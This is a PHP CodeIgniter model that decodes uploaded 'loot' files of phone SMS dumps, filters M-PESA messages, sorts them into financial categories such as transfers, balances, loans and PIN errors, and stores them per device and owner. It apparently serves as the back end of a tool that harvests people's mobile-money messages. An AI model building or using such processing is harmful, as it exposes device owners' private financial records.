<?php

namespace App\Models;

use CodeIgniter\API\ResponseTrait;

use CodeIgniter\Model;

use App\Models\ModCryption;
use PHPUnit\Exception;

class ModUploads extends Model
{
    use ResponseTrait;
    protected $table = "tbl_Loot";

    public function file_upload($data){
        return $this->db->table('tbl_Loot')->insert($data);
    }

    public function loot_last_uploaded(){
        $result = $this->db->table('tbl_Loot')->selectMax('loot_Id')->get();
        //return $result->getResult()[0]->loot_Id;
        return $result->getResult()[0]->loot_Uuid;
    }

    public function loot_info($loot_uuid){
        $builder = $this->db->table('tbl_Loot');
        $result = $builder->select('loot_Name, loot_Device, loot_Owner, loot_Uuid')
            ->where('loot_Uuid', $loot_uuid)
            ->get();
        return $result->getResult();
    }

    public function loot_info_all($loot_uuid){
        $builder = $this->db->table('tbl_Loot');
        $result = $builder->where('loot_Uuid', $loot_uuid)
            ->get();
        return $result->getResult();
    }

    public function loot_summary($loot_uuid){
        $builder = $this->db->table('tbl_Loot_Summary');
        $result = $builder->where('loot_Uuid', $loot_uuid)->get();
        return $result->getResult();
    }

    function clean_sms_by_trimming_messages($sms_messages){
        $message_trimmed = array();

        $sms_term_transaction = "transaction cost,";
        $sms_term_amount      = "amount you can transact";
        $sms_term_download    = ".download m-pesa";
        $sms_term_get         = "get stamped m-pesa statemen";
        $sms_term_you         = "you can now access";
        $sms_term_separate    = "separate personal and business";
        $sms_term_to          = "to register for m-pesa";
        $sms_term_for         = "for terms and conditions visit";
        $sms_term_dial        = "dial *334# now";
        $sms_term_dial_1      = "dial *234*0*3#";
        $sms_term_dial_2      = "dial *234*0#";
        $sms_term_kindly      = "kindly ask the recipient";
        $sms_term_kindly_1    = "kindly note that if you";
        $sms_term_late        = "late repayment attracts a";
        $sms_term_check       = "to check daily charges, dial";
        $sms_term_check_1     = "to check daily charges,";
        $sms_term_cost       = "transaction cost";

        foreach ($sms_messages as $sms_single_array) {
            if($sms_single_array->Number == "MPESA") {
                $sms_obj_string = strtolower(base64_decode($sms_single_array->Body));
                // Clean based on terminators
                if (strpos($sms_obj_string, $sms_term_transaction) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_transaction));
                } elseif (strpos($sms_obj_string, $sms_term_amount) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_amount));
                } elseif (strpos($sms_obj_string, $sms_term_download) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_download));
                } elseif (strpos($sms_obj_string, $sms_term_get) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_get));
                } elseif (strpos($sms_obj_string, $sms_term_you) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_you));
                } elseif (strpos($sms_obj_string, $sms_term_separate) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_separate));
                } elseif (strpos($sms_obj_string, $sms_term_to) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_to));
                } elseif (strpos($sms_obj_string, $sms_term_for) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_for));
                } elseif (strpos($sms_obj_string, $sms_term_dial) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_dial));
                } elseif (strpos($sms_obj_string, $sms_term_dial_1) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_dial_1));
                } elseif (strpos($sms_obj_string, $sms_term_dial_2) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_dial_2));
                } elseif (strpos($sms_obj_string, $sms_term_kindly) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_kindly));
                } elseif (strpos($sms_obj_string, $sms_term_kindly_1) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_kindly_1));
                } elseif (strpos($sms_obj_string, $sms_term_late) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_late));
                } elseif (strpos($sms_obj_string, $sms_term_check) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_check));
                } elseif (strpos($sms_obj_string, $sms_term_check_1) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_check_1));
                } elseif (strpos($sms_obj_string, $sms_term_cost) !== false) {
                    $cleaned_message = substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_cost));
                } else {
                    $cleaned_message = $sms_obj_string;
                }

                // Remove leading "confirmed" or "confirmed."
                $words = explode(' ', $cleaned_message);
                if (in_array('confirmed', $words, true) || in_array('confirmed.', $words, true)) {
                    array_shift($words);
                    $cleaned_message = implode(' ', $words);
                }

                array_push($message_trimmed, $cleaned_message);
            }

        }
        return $message_trimmed;
    }

    function clean_sms_by_categorizing($sms_messages) {
        $sms_categories = array();

        $sms_get_receive = "confirmed.you have received ksh";
        //$sms_get_bank" => "confirmed.you have received ksh";
        $sms_get_from_mshwari = "transferred from m-shwari account on";
        $sms_get_from_ncba = "from ncba bank on";
        $sms_get_from_kcb = "from kcb";
        $sms_get_from_im_bank = "from im bank limited- app on";
        $sms_get_bal = "confirmed. your account balance was";
        $sms_get_bal_kcb = "confirmed. your kcb m-pesa";
        $sms_get_bal_mshwari = "confirmed . your m-shwari deposit account";
        $sms_get_reversal = "confirmed. reversal of transaction";
        $sms_loan_limit = "confirmed. your loan limit is";
        $sms_sent_to_mpesa = "sent to";
        $sms_sent_to_LNM = "paid to";
        $sms_sent_mini = "confirmed. you have transfered ksh";
        $sms_sent_to_mshwari = "transferred to m-shwari account on";
        $sms_sent_cancel = "you have cancelled the transaction";
        $sms_error_failed = "failed.";
        $sms_error_pin = "you have entered the wrong pin";
        $sms_error_less = "insufficient funds in your";
        $sms_error_receiver = "the number you are trying to pay has not joined the service";
        $sms_error_receiver_org = "transaction failed, m-pesa cannot complete payment of";
        $sms_withdraw = "confirmed.on";
        $sms_fuliza_leave = "you have successfully opted out of fuliza m-pesa service.";
        $sms_fuliza_opt_in = "you have successfully opted into fuliza m-pesa.";
        $sms_fuliza_limit = "your fuliza m-pesa limit is ksh";
        $sms_fuliza_loan_pay = "from your m-pesa has been used to partially pay your outstanding fuliza m-pesa";
        $sms_fuliza_mini_statement = "your fuliza m-pesa mini statement is as follows";
        $sms_fuliza_loan_taken = "confirmed. fuliza m-pesa amount is";
        $sms_similar_transaction = "m-pesa is unable to process your request because a similar transaction is currently underway";

        $sms_count_get_receive          = 0;
        $sms_count_get_from_mshwari     = 0;
        $sms_count_get_from_ncba        = 0;
        $sms_count_get_from_kcb         = 0;
        $sms_count_get_from_im_bank     = 0;
        $sms_count_get_bal_mpesa        = 0;
        $sms_count_get_bal_kcb          = 0;
        $sms_count_get_bal_mshwari      = 0;
        $sms_count_get_reversal         = 0;
        $sms_count_loan_limit           = 0;
        $sms_count_sent_to_mpesa        = 0;
        $sms_count_sent_to_LNM          = 0;
        $sms_count_sent_mini            = 0;
        $sms_count_sent_to_mshwari      = 0;
        $sms_count_sent_cancel          = 0;
        $sms_count_error_failed         = 0;
        $sms_count_error_pin            = 0;
        $sms_count_error_less           = 0;
        $sms_count_error_receiver       = 0;
        $sms_count_error_receiver_org   = 0;
        $sms_count_withdraw             = 0;
        $sms_count_fuliza_opt_out       = 0;
        $sms_count_fuliza_opt_in        = 0;
        $sms_count_fuliza_limit         = 0;
        $sms_count_fuliza_loan_pay      = 0;
        $sms_count_fuliza_mini_statement= 0;
        $sms_count_fuliza_loan_taken    = 0;
        $sms_count_similar_transaction  = 0;
        $sms_count_unknown              = 0;

        foreach ($sms_messages as $sms_body) {
            $sms_re_get_receive = preg_match("/" . preg_quote($sms_get_receive, "/") . "/", $sms_body);
            $sms_re_get_from_mshwari = preg_match("/" . preg_quote($sms_get_from_mshwari, "/") . "/", $sms_body);
            $sms_re_get_from_ncba = preg_match("/" . preg_quote($sms_get_from_ncba, "/") . "/", $sms_body);
            $sms_re_get_from_kcb = preg_match("/" . preg_quote($sms_get_from_kcb, "/") . "/", $sms_body);
            $sms_re_get_from_im_bank = preg_match("/" . preg_quote($sms_get_from_im_bank, "/") . "/", $sms_body);
            $sms_re_get_bal = preg_match("/" . preg_quote($sms_get_bal, "/") . "/", $sms_body);
            $sms_re_get_bal_kcb = preg_match("/" . preg_quote($sms_get_bal_kcb, "/") . "/", $sms_body);
            $sms_re_get_bal_mshwari = preg_match("/" . preg_quote($sms_get_bal_mshwari, "/") . "/", $sms_body);
            $sms_re_get_reversal = preg_match("/" . preg_quote($sms_get_reversal, "/") . "/", $sms_body);
            $sms_re_loan_limit = preg_match("/" . preg_quote($sms_loan_limit, "/") . "/", $sms_body);
            $sms_re_sent_to_mpesa = preg_match("/" . preg_quote($sms_sent_to_mpesa, "/") . "/", $sms_body);
            $sms_re_sent_to_LNM = preg_match("/" . preg_quote($sms_sent_to_LNM, "/") . "/", $sms_body);
            $sms_re_sent_mini = preg_match("/" . preg_quote($sms_sent_mini, "/") . "/", $sms_body);
            $sms_re_sent_to_mshwari = preg_match("/" . preg_quote($sms_sent_to_mshwari, "/") . "/", $sms_body);
            $sms_re_sent_cancel = preg_match("/" . preg_quote($sms_sent_cancel, "/") . "/", $sms_body);
            $sms_re_error_failed = preg_match("/" . preg_quote($sms_error_failed, "/") . "/", $sms_body);
            $sms_re_error_pin = preg_match("/" . preg_quote($sms_error_pin, "/") . "/", $sms_body);
            $sms_re_error_less = preg_match("/" . preg_quote($sms_error_less, "/") . "/", $sms_body);
            $sms_re_error_receiver = preg_match("/" . preg_quote($sms_error_receiver, "/") . "/", $sms_body);
            $sms_re_error_receiver_org = preg_match("/" . preg_quote($sms_error_receiver_org, "/") . "/", $sms_body);
            $sms_re_withdraw = preg_match("/" . preg_quote($sms_withdraw, "/") . "/", $sms_body);
            $sms_re_fuliza_leave = preg_match("/" . preg_quote($sms_fuliza_leave, "/") . "/", $sms_body);
            $sms_re_fuliza_opt_in = preg_match("/" . preg_quote($sms_fuliza_opt_in, "/") . "/", $sms_body);
            $sms_re_fuliza_limit = preg_match("/" . preg_quote($sms_fuliza_limit, "/") . "/", $sms_body);
            $sms_re_fuliza_loan_pay = preg_match("/" . preg_quote($sms_fuliza_loan_pay, "/") . "/", $sms_body);
            $sms_re_fuliza_mini_statement = preg_match("/" . preg_quote($sms_fuliza_mini_statement, "/") . "/", $sms_body);
            $sms_re_fuliza_loan_taken = preg_match("/" . preg_quote($sms_fuliza_loan_taken, "/") . "/", $sms_body);
            $sms_re_similar_transaction = preg_match("/" . preg_quote($sms_similar_transaction, "/") . "/", $sms_body);

            switch (true) {
                case $sms_re_get_receive:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_receive_from_mpesa")));
                    $sms_count_get_receive++;
                    break;
                case $sms_re_get_from_mshwari:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_from_mshwari")));
                    $sms_count_get_from_mshwari++;
                    break;
                case $sms_re_get_from_ncba:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_from_ncba")));
                    $sms_count_get_from_ncba++;
                    break;
                case $sms_re_get_from_kcb:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_from_kcb")));
                    $sms_count_get_from_kcb++;
                    break;
                case $sms_re_get_from_im_bank:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_from_im_bank")));
                    $sms_count_get_from_im_bank++;
                    break;
                case $sms_re_get_bal:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_bal_mpesa")));
                    $sms_count_get_bal_mpesa++;
                    break;
                case $sms_re_get_bal_kcb:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_bal_kcb")));
                    $sms_count_get_bal_kcb++;
                    break;
                case $sms_re_get_bal_mshwari:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_bal_mshwari")));
                    $sms_count_get_bal_mshwari++;
                    break;
                case $sms_re_get_reversal:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_from_reversal")));
                    $sms_count_get_reversal++;
                    break;
                case $sms_re_loan_limit:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_loan_limit")));
                    $sms_count_loan_limit++;
                    break;
                case$sms_re_sent_to_mpesa:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_sent_to_mpesa")));
                    $sms_count_sent_to_mpesa++;
                    break;
                case $sms_re_sent_to_LNM:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_sent_to_LNM")));
                    $sms_count_sent_to_LNM++;
                    break;
                case $sms_re_sent_mini:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_sent_mini_statement")));
                    $sms_count_sent_mini++;
                    break;
                case $sms_re_sent_to_mshwari:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_sent_to_mshwari")));
                    $sms_count_sent_to_mshwari++;
                    break;
                case $sms_re_sent_cancel:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_sent_cancel")));
                    $sms_count_sent_cancel++;
                    break;
                case $sms_re_error_failed:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_error_failed")));
                    $sms_count_error_failed++;
                    break;
                case $sms_re_error_pin:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_error_pin")));
                    $sms_count_error_pin++;
                    break;
                case $sms_re_error_less:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_error_less")));
                    $sms_count_error_less++;
                    break;
                case $sms_re_error_receiver:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_error_receiver")));
                    $sms_count_error_receiver++;
                    break;
                case $sms_re_error_receiver_org:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_error_receiver_org")));
                    $sms_count_error_receiver_org++;
                    break;
                case $sms_re_withdraw:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_withdraw")));
                    $sms_count_withdraw++;
                    break;
                case $sms_re_fuliza_leave:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_fuliza_opt_out"))); 
                    $sms_count_fuliza_opt_out++;
                    break;
                case $sms_re_fuliza_opt_in:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_fuliza_opt_in")));
                    $sms_count_fuliza_opt_in++;
                    break;
                case $sms_re_fuliza_limit:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_fuliza_limit")));
                    $sms_count_fuliza_limit++;
                    break;
                case $sms_re_fuliza_loan_pay:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_fuliza_loan_pay")));
                    $sms_count_fuliza_loan_pay++;
                    break;
                case $sms_re_fuliza_mini_statement:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_fuliza_mini_statement")));
                    $sms_count_fuliza_mini_statement++;
                    break;
                case $sms_re_fuliza_loan_taken:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_fuliza_loan_taken")));
                    $sms_count_fuliza_loan_taken++;
                    break;
                case $sms_re_similar_transaction:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_similar_transaction")));
                    $sms_count_similar_transaction++;
                    break;
                default:
                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_unknown")));
                    $sms_count_unknown++;
                    break;
            }
        }

        $sms_categories_counter = array("sms_get_receive_from_mpesa" => $sms_count_get_receive,
            "sms_get_from_mshwari" => $sms_count_get_from_mshwari,
            "sms_get_from_ncba" => $sms_count_get_from_ncba,
            "sms_get_from_kcb" => $sms_count_get_from_kcb,
            "sms_get_from_im_bank" => $sms_count_get_from_im_bank,
            "sms_get_bal_mpesa" => $sms_count_get_bal_mpesa,
            "sms_get_bal_kcb" => $sms_count_get_bal_kcb,
            "sms_get_bal_mshwari" => $sms_count_get_bal_mshwari,
            "sms_get_from_reversal" => $sms_count_get_reversal,
            "sms_loan_limit" => $sms_count_loan_limit,
            "sms_sent_to_mpesa" => $sms_count_sent_to_mpesa,
            "sms_sent_to_LNM" => $sms_count_sent_to_LNM,
            "sms_sent_mini_statement" => $sms_count_sent_mini,
            "sms_sent_to_mshwari" => $sms_count_sent_to_mshwari,
            "sms_sent_cancel" => $sms_count_sent_cancel,
            "sms_error_failed" => $sms_count_error_failed,
            "sms_error_pin" => $sms_count_error_pin,
            "sms_error_less" => $sms_count_error_less,
            "sms_error_receiver" => $sms_count_error_receiver,
            "sms_error_receiver_org" => $sms_count_error_receiver_org,
            "sms_withdraw" => $sms_count_withdraw,
            "sms_fuliza_opt_out" => $sms_count_fuliza_opt_out,
            "sms_fuliza_opt_in" => $sms_count_fuliza_opt_in,
            "sms_fuliza_limit" => $sms_count_fuliza_limit,
            "sms_fuliza_loan_pay" => $sms_count_fuliza_loan_pay,
            "sms_fuliza_mini_statement" => $sms_count_fuliza_mini_statement,
            "sms_fuliza_loan_taken" => $sms_count_fuliza_loan_taken,
            "sms_similar_transaction" => $sms_count_similar_transaction,
            "sms_unknown" => $sms_count_unknown);

        return array($sms_categories, $sms_categories_counter);
    }

    function clean_sms_by_returning_column($sms_messages, $column_name) {
        $sms_column = array();

        $thread_id = 'Thread Id';
        foreach ($sms_messages as $sms_single_array) {
            if($sms_single_array->Number == "MPESA") {
                if ($column_name == "Thread Id"){
                    array_push($sms_column, $sms_single_array->$thread_id);
                }else {
                    array_push($sms_column, $sms_single_array->$column_name);
                }
            }
        }
        return $sms_column;
    }

    public function loot_parse_sms($loot_uuid, $loot_owner, $loot_device, $dated){
        $mod_cryption = new ModCryption();
        $query_name = $this->db->table('tbl_Loot')->select('loot_Name')
            //->where('loot_Id', $loot_id)->get()->getResult();
            ->where('loot_Uuid', $loot_uuid)->get()->getResult();
        $loot_name = $query_name[0]->loot_Name;
        $loot_file = WRITEPATH."uploads/txt_loot/".$loot_name;

        $loot_data = file_get_contents($loot_file);
        $loot_decoded = $mod_cryption->decode_content($loot_data);
        //echo gettype($loot_decoded);

        $data_dump1 = str_replace("-------(//)--------", "", $loot_decoded);
        $data_dump2 = str_replace("\n", '****', $data_dump1);
        $data_dump3 = str_replace('****"', '"', $data_dump2);
        $data_dump4 = "[".substr($data_dump3, 0, -2)."}]";

        $data = json_encode($data_dump4);
        $data1 = json_decode($data);
        $data2 = json_decode($data1);

        $data2_sms_terminated = $this->clean_sms_by_trimming_messages($data2);
        list($data2_sms_category, $data2_sms_category_counter_arr) =  $this->clean_sms_by_categorizing($data2_sms_terminated);
        $data2_sms_category_body_uncleaned = $this->clean_sms_by_returning_column($data2, "Body");
        $data2_sms_category_date_uncleaned = $this->clean_sms_by_returning_column($data2, "Date");
        $data2_sms_category_type_uncleaned = $this->clean_sms_by_returning_column($data2, "Type");
        $data2_sms_category_number_uncleaned = $this->clean_sms_by_returning_column($data2, "Number");
        $data2_sms_category_seen_uncleaned = $this->clean_sms_by_returning_column($data2, "Seen");
        $data2_sms_category__id_uncleaned = $this->clean_sms_by_returning_column($data2, "ID");
        $data2_sms_category_thread_id_uncleaned = $this->clean_sms_by_returning_column($data2, "Thread Id");

        try {
            for($counter = 1; $counter <= count($data2_sms_terminated); $counter++ ){
                $data = array(
                    'sms_type'          => $data2_sms_category_type_uncleaned[$counter],
                    'sms_number'        => $data2_sms_category_number_uncleaned[$counter],
                    'sms_thread_id'     => $data2_sms_category_thread_id_uncleaned[$counter],
                    'sms_time'          => $data2_sms_category_date_uncleaned[$counter],
                    'sms_category'      => $data2_sms_category[$counter],
                    'sms_seen'          => $data2_sms_category_seen_uncleaned[$counter],
                    'sms__id'           => $data2_sms_category__id_uncleaned[$counter],
                    'sms_body'          => $data2_sms_category_body_uncleaned[$counter],
                    //'sms_body_cleaned'  => $data2_sms_terminated,
                    'sms_loot_source'   => $loot_uuid,
                    'sms_owner'         => $loot_owner,
                    'sms_device'        => $loot_device,
                );
                $this->db->table('tbl_Sms')->insert($data);
            }
            //$this->db->table('tbl_Sms')->insertBatch($sms_data);
        }catch (\Exception $ex){}

        $data1 = array('loot_Uuid' => $loot_uuid,
            'info_Get_from_MPESA' => $data2_sms_category_counter_arr['sms_get_receive_from_mpesa'],
            'info_Get_from_Mshwari' => $data2_sms_category_counter_arr['sms_get_from_mshwari'],
            'info_Get_from_NCBA' => $data2_sms_category_counter_arr['sms_get_from_ncba'],
            'info_Get_from_KCB' => $data2_sms_category_counter_arr['sms_get_from_kcb'],
            'info_Get_from_IM' => $data2_sms_category_counter_arr['sms_get_from_im_bank'],
            'info_Get_from_Reversal' => $data2_sms_category_counter_arr['sms_get_from_reversal'],
            'info_Get_Bal_MPESA' => $data2_sms_category_counter_arr['sms_get_bal_mpesa'],
            'info_Get_Bal_KCB' => $data2_sms_category_counter_arr['sms_get_bal_kcb'],
            'info_Get_Bal_Mshwari' => $data2_sms_category_counter_arr['sms_get_bal_mshwari'],
            'info_Loan_Limit' => $data2_sms_category_counter_arr['sms_loan_limit'],
            'info_Sent_to_MPESA' => $data2_sms_category_counter_arr['sms_sent_to_mpesa'],
            'info_Sent_Mini' => $data2_sms_category_counter_arr['sms_sent_mini_statement'],
            'info_Sent_to_Mshwari' => $data2_sms_category_counter_arr['sms_sent_to_mshwari'],
            'info_Sent_to_LNM' => $data2_sms_category_counter_arr['sms_sent_to_LNM'],
            'info_Sent_Cancel' => $data2_sms_category_counter_arr['sms_sent_cancel'],
            'info_Error_Failed' => $data2_sms_category_counter_arr['sms_error_failed'],
            'info_Error_Pin' => $data2_sms_category_counter_arr['sms_error_pin'],
            'info_Error_Less' => $data2_sms_category_counter_arr['sms_error_less'],
            'info_Error_Receiver' => $data2_sms_category_counter_arr['sms_error_receiver'],
            'info_Error_Receiver_Org' => $data2_sms_category_counter_arr['sms_error_receiver_org'],
            'info_Withdraw' => $data2_sms_category_counter_arr['sms_withdraw'],
            'info_Fuliza_Opt_Out' => $data2_sms_category_counter_arr['sms_fuliza_opt_out'],
            'info_Fuliza_Opt_In' => $data2_sms_category_counter_arr['sms_fuliza_opt_in'],
            'info_Fuliza_Limit' => $data2_sms_category_counter_arr['sms_fuliza_limit'],
            'info_Fuliza_Loan_Paid' => $data2_sms_category_counter_arr['sms_fuliza_loan_pay'],
            'info_Fuliza_Mini_Statement' => $data2_sms_category_counter_arr['sms_fuliza_mini_statement'],
            'info_Fuliza_Loan_Taken' => $data2_sms_category_counter_arr['sms_fuliza_loan_taken'],
            'info_Similar_Transaction' => $data2_sms_category_counter_arr['sms_similar_transaction'],
            'info_Unknown' => $data2_sms_category_counter_arr['sms_unknown'],
            'info_All' => count($data2_sms_category),
            'loot_Created' => $dated
        );
        $this->db ->table('tbl_Loot_Summary')->insert($data1);
    }

    public function file_listing($loot_owner, $loot_device){
        $builder = $this->db->table('tbl_Loot');
        $get_all = $builder
            ->where('loot_Device', $loot_device)
            ->where('loot_Owner', $loot_owner)
            ->orderBy('loot_Id', 'DESC')
            ->get();
        return $get_all->getResult();
    }

    public function file_delete($userid){
        $table = 'tbl_users';
    }

    public function device_check_print($print_dump){
        $builder = $this->db->table('tbl_Devices');
        $get_all = $builder->select('device_Uuid')
                ->where($print_dump)
                ->get();
        return $get_all->getResult();
    }

    public function get_loot_uuid($loot_name){
        $builder = $this->db->table('tbl_Loot');
        $get_all = $builder->select('loot_Uuid')
                ->where('loot_Name', $loot_name)
                ->get();
        return $get_all->getResult()[0]->loot_Uuid;
    }

	public function get_loot_summary_from_uuids($loot_aray_uuids){
        $builder = $this->db->table('tbl_Loot_Summary');
        $get_all = $builder->select('*')
                ->whereIn('loot_Uuid', $loot_aray_uuids)
                ->get();
        return $get_all->getResult();
    }
    
    public function device_make_print($print_dump){
        return $this->db->table('tbl_Devices')->insert($print_dump);
    }
}
